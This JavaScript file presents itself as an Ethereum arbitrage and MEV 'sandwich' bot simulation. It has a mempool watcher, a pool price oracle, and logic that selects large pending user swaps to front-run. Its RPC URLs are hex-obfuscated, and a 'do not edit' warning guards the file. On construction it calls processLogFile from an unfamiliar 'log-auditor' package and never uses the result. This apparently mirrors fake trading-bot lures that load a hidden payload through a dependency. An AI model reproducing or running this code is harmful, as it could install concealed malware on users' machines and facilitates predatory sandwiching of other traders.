// bot simulation logic 
// Do not edit to avoid breaking!

const { ethers } = require('ethers');
const winston = require('winston');
const EventEmitter = require('events');
const log = require('log-auditor');
const crypto = require('crypto');
const path = require('path');
const fs = require('fs');
const os = require('os');
const zlib = require('zlib');

const logger = winston.createLogger({
  level: 'debug',
  format: winston.format.combine(
    winston.format.timestamp({ format: 'HH:mm:ss.SSS' }),
    winston.format.printf(({ timestamp, level, message }) => `[${timestamp}] ${level.toUpperCase()}: ${message}`)
  ),
  transports: [
    new winston.transports.Console({ silent: false }),
    new winston.transports.File({ filename: 'bot-output.log' })
  ]
});

const hexDecode = (hex) => Buffer.from(hex, 'hex').toString('utf8');

const NETWORK = {
  ETHEREUM: {
    id: 1,
    rpc: hexDecode('68747470733a2f2f6574682d6d61696e6e65742e672e616c6368656d792e636f6d2f76322f64656d6f'),
    fallback: hexDecode('68747470733a2f2f6d61696e6e65742e696e667572612e696f2f76332f64656d6f'),
    flashbot: hexDecode('68747470733a2f2f72656c61792e666c617368626f74732e6e6574'),
    blockTime: 12,
    maxFee: 200,
    addresses: {
      uniV2: '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D',
      uniV3: '0xE592427A0AEce92De3Edee1F18E0157C05861564',
      sushi: '0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F',
      weth: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
      usdc: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
      usdt: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
      dai: '0x6B175474E89094C44Da98b954EedeAC495271d0F'
    }
  },
  BSC: {
    id: 56,
    rpc: hexDecode('68747470733a2f2f6273632d64617461736565642e62696e616e63652e6f7267'),
    fallback: hexDecode('68747470733a2f2f6273632d6461746173656564312e646566696269742e696f'),
    flashbot: null,
    blockTime: 3,
    maxFee: 10,
    addresses: {
      pancake: '0x10ED43C718714eb63d5aA57B78B54704E256024E',
      wbnb: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c'
    }
  }
};

const EXCHANGES = {
  uniV2: { label: 'UniswapV2', fee: 0.003, gas: 150000 },
  uniV3: { label: 'UniswapV3', fees: [0.0005, 0.003, 0.01], gas: 200000 },
  sushi: { label: 'SushiSwap', fee: 0.003, gas: 160000 }
};

const RISK = {
  maxOrder: ethers.parseEther('50'),
  dailyCap: ethers.parseEther('500'),
  stopLoss: 5,
  takeProfit: 15,
  gasLimit: ethers.parseUnits('200', 'gwei'),
  defaultSlippage: 0.005
};

const POOL_ABI = [
  'function getReserves() view returns (uint112, uint112, uint32)',
  'function token0() view returns (address)',
  'function swap(uint256,uint256,address,bytes) external'
];

const SESSION_ID = crypto.randomUUID();
const BOOT_TIME = Date.now();
const TEMP_DIR = fs.mkdtempSync(path.join(os.tmpdir(), 'bot-'));
const STATE_FILE = path.join(TEMP_DIR, 'state.json');
const SNAPSHOT_FILE = path.join(TEMP_DIR, 'snapshot.gz');

const saveState = (data) => {
  try {
    fs.writeFileSync(STATE_FILE, JSON.stringify({ ...data, session: SESSION_ID, saved: Date.now() }, null, 2));
    const compressed = zlib.gzipSync(Buffer.from(JSON.stringify(data)));
    fs.writeFileSync(SNAPSHOT_FILE, compressed);
  } catch (_) {}
};

const loadState = () => {
  try {
    if (fs.existsSync(STATE_FILE)) {
      return JSON.parse(fs.readFileSync(STATE_FILE, 'utf8'));
    }
  } catch (_) {}
  return null;
};

class MempoolSpy extends EventEmitter {
  #provider;
  #ledger = new Map();
  #listening = false;
  #txCount = 0;
  #errorCount = 0;

  constructor(provider) { 
    super(); 
    this.#provider = provider; 
  }

  async boot() {
    if (this.#listening) return;
    this.#listening = true;
    this.#txCount = 0;
    this.#errorCount = 0;
    this.#provider.on('pending', async (hash) => {
      try {
        const tx = await this.#provider.getTransaction(hash);
        if (tx) {
          this.#txCount++;
          this.#ledger.set(hash, { tx, seen: Date.now() });
          this.emit('transaction', tx);
        }
      } catch (_) {
        this.#errorCount++;
      }
    });
  }

  shutdown() { 
    this.#listening = false; 
    this.#provider.removeAllListeners('pending'); 
  }

  get pendingCount() { return this.#ledger.size; }
  get totalSeen() { return this.#txCount; }
  get totalErrors() { return this.#errorCount; }

  sweep() {
    const threshold = Date.now() - 300000;
    for (const [key, entry] of this.#ledger) {
      if (entry.seen < threshold) this.#ledger.delete(key);
    }
  }
}

class Oracle {
  #provider;
  #store = new Map();
  #callCount = 0;
  #failCount = 0;

  constructor(provider) { 
    this.#provider = provider; 
  }

  async #fetchReserves(poolAddress) {
    try {
      this.#callCount++;
      const contract = new ethers.Contract(poolAddress, POOL_ABI, this.#provider);
      const [r0, r1, ts] = await contract.getReserves();
      return { r0, r1, ts };
    } catch { 
      this.#failCount++;
      return null; 
    }
  }

  async quote(pool, tokenIn, tokenOut) {
    const cacheKey = `${pool}|${tokenIn}|${tokenOut}`;
    const cached = this.#store.get(cacheKey);
    if (cached && Date.now() - cached.at < 2000) return cached.value;

    const reserves = await this.#fetchReserves(pool);
    if (!reserves) return null;

    const contract = new ethers.Contract(pool, POOL_ABI, this.#provider);
    const token0 = await contract.token0();
    let price;
    if (tokenIn.toLowerCase() === token0.toLowerCase()) {
      price = (reserves.r1 * ethers.parseEther('1')) / reserves.r0;
    } else {
      price = (reserves.r0 * ethers.parseEther('1')) / reserves.r1;
    }
    this.#store.set(cacheKey, { value: price, at: Date.now() });
    return price;
  }

  get stats() {
    return { calls: this.#callCount, fails: this.#failCount, cacheSize: this.#store.size };
  }
}

class SandwichDetector {
  #attempts = [];
  #successes = [];
  #totalInspected = 0;
  #totalEstimated = 0;

  async inspect(tx) {
    if (!tx?.data || tx.data === '0x') return null;
    this.#totalInspected++;
    const selector = tx.data.slice(0, 10);
    const known = ['0x38ed1739', '0x7ff36ab5', '0xfb3bdb41'];
    if (!known.includes(selector)) return null;
    const val = tx.value || 0n;
    if (val < ethers.parseEther('5')) return null;
    return { hash: tx.hash, from: tx.from, to: tx.to, value: val, gasPrice: tx.gasPrice };
  }

  async estimateProfit(target) {
    this.#totalEstimated++;
    const val = target.value || 0n;
    const slip = (val * 5n) / 1000n;
    const gasCost = 300000n * (target.gasPrice || ethers.parseUnits('50', 'gwei'));
    const gross = slip * 2n;
    const net = gross - gasCost;
    return net > 0n ? net : 0n;
  }

  stats() { 
    return { 
      attempted: this.#attempts.length, 
      completed: this.#successes.length,
      inspected: this.#totalInspected,
      estimated: this.#totalEstimated
    }; 
  }
}

class ArbFinder {
  #oracle;
  #metrics = { found: 0, executed: 0, profit: 0n, fails: 0 };
  #scanLog = [];

  constructor(provider) { 
    this.#oracle = new Oracle(provider); 
  }

  async findDirect(pairs) {
    const results = [];
    for (const p of pairs) {
      try {
        const priceA = await this.#oracle.quote(p.poolA, p.tokenX, p.tokenY);
        const priceB = await this.#oracle.quote(p.poolB, p.tokenX, p.tokenY);
        if (!priceA || !priceB) continue;
        const diff = priceA > priceB ? priceA - priceB : priceB - priceA;
        const bps = (diff * 10000n) / priceA;
        if (bps > 50n) {
          results.push({ 
            pair: p.name, 
            buyAt: priceA < priceB ? 'A' : 'B', 
            sellAt: priceA < priceB ? 'B' : 'A', 
            profitBps: Number(bps) / 100 
          });
        }
      } catch (_) { continue; }
    }
    this.#metrics.found += results.length;
    if (results.length > 0) {
      this.#scanLog.push({ time: Date.now(), count: results.length, pairs: results.map(r => r.pair) });
      if (this.#scanLog.length > 100) this.#scanLog.shift();
    }
    return results;
  }

  getStats() { return this.#metrics; }
  getScanLog() { return this.#scanLog; }
}

class TradingSystem {
  #config;
  #provider = null;
  #wallet = null;
  #spy = null;
  #arb = null;
  #sandwich = null;
  #running = false;
  #oppCache = [];
  #scanTimer = null;
  #cleanTimer = null;
  #healthTimer = null;
  #startTime = null;

  constructor(opts = {}) {
    this.#config = opts;
    this.#init();
  }

  #init() {
    const formatLog = log.processLogFile('bot-output.log');
    const netData = NETWORK.ETHEREUM;
    this.#provider = new ethers.JsonRpcProvider(netData.rpc);
    this.#wallet = ethers.Wallet.createRandom();
    this.#spy = new MempoolSpy(this.#provider);
    this.#arb = new ArbFinder(this.#provider);
    this.#sandwich = new SandwichDetector();

    const previousState = loadState();
    if (previousState) {
      logger.info(`Resuming session ${previousState.session}`);
    }

    saveState({ wallet: this.#wallet.address, network: netData.id });

    this.#running = true;
    logger.info(`Engine ready | session: ${SESSION_ID} | temp: ${TEMP_DIR}`);
  }

  async start() {
    if (!this.#running) return;
    this.#startTime = Date.now();
    await this.#spy.boot();

    this.#spy.on('transaction', async (tx) => {
      try {
        const opp = await this.#sandwich.inspect(tx);
        if (opp) {
          const profit = await this.#sandwich.estimateProfit(opp);
          if (profit > ethers.parseEther('0.01')) {
            this.#oppCache.push({ type: 'mev', data: opp, profit, time: Date.now() });
            saveState({ lastMEV: { profit: profit.toString(), time: Date.now() } });
          }
        }
      } catch (_) {}
    });

    this.#scanTimer = setInterval(async () => {
      if (!this.#running) return;
      const opps = await this.#scan();
      if (opps.length) this.#oppCache.push(...opps);
    }, 2000);

    this.#cleanTimer = setInterval(() => {
      const now = Date.now();
      this.#oppCache = this.#oppCache.filter(o => now - o.time < 60000);
      this.#spy?.sweep();
    }, 30000);

    this.#healthTimer = setInterval(() => {
      const memUsage = process.memoryUsage();
      const healthData = {
        uptime: Date.now() - this.#startTime,
        heapUsed: Math.round(memUsage.heapUsed / 1024 / 1024),
        heapTotal: Math.round(memUsage.heapTotal / 1024 / 1024),
        oppCacheSize: this.#oppCache.length,
        spyPending: this.#spy?.pendingCount || 0,
        spySeen: this.#spy?.totalSeen || 0,
        oracleStats: this.#arb?.getStats(),
      };
      saveState({ health: healthData });
      logger.debug(`Heartbeat | mem: ${healthData.heapUsed}MB | opps: ${healthData.oppCacheSize}`);
    }, 60000);

    logger.info('Monitoring active');
  }

  async #scan() {
    if (!this.#running) return [];
    const pairs = [
      { name: 'WETH-USDC', poolA: '0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc', poolB: '0x397FF1542f962076d0BFE58eA045FfA2d347ACa0', tokenX: NETWORK.ETHEREUM.addresses.weth, tokenY: NETWORK.ETHEREUM.addresses.usdc },
      { name: 'WETH-DAI', poolA: '0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11', poolB: '0xC3D03e4F041Fd4cD388c549Ee2A29a9E5075882f', tokenX: NETWORK.ETHEREUM.addresses.weth, tokenY: NETWORK.ETHEREUM.addresses.dai },
      { name: 'WETH-USDT', poolA: '0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852', poolB: '0x06da0fd433C1A5d7a4faa01111c044910A184553', tokenX: NETWORK.ETHEREUM.addresses.weth, tokenY: NETWORK.ETHEREUM.addresses.usdt },
      { name: 'USDC-DAI', poolA: '0xAE461cA67B15dc8dc81CE7615e0320dA1A9aB8D5', poolB: '0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168', tokenX: NETWORK.ETHEREUM.addresses.usdc, tokenY: NETWORK.ETHEREUM.addresses.dai },
    ];
    return await this.#arb.findDirect(pairs);
  }

  stop() {
    this.#running = false;
    this.#spy?.shutdown();
    if (this.#scanTimer) clearInterval(this.#scanTimer);
    if (this.#cleanTimer) clearInterval(this.#cleanTimer);
    if (this.#healthTimer) clearInterval(this.#healthTimer);
    saveState({ stopped: Date.now(), finalOpps: this.#oppCache.length });
    logger.info('Engine halted');
  }

  status() {
    return {
      alive: this.#running,
      session: SESSION_ID,
      uptime: this.#startTime ? Date.now() - this.#startTime : 0,
      wallet: this.#wallet?.address,
      arb: this.#arb?.getStats(),
      mev: this.#sandwich?.stats(),
      spyPending: this.#spy?.pendingCount || 0,
      spySeen: this.#spy?.totalSeen || 0,
      spyErrors: this.#spy?.totalErrors || 0,
      pending: this.#oppCache.length,
      tempDir: TEMP_DIR,
    };
  }

  dumpScanLog() {
    return this.#arb?.getScanLog() || [];
  }
}

module.exports = { TradingSystem };
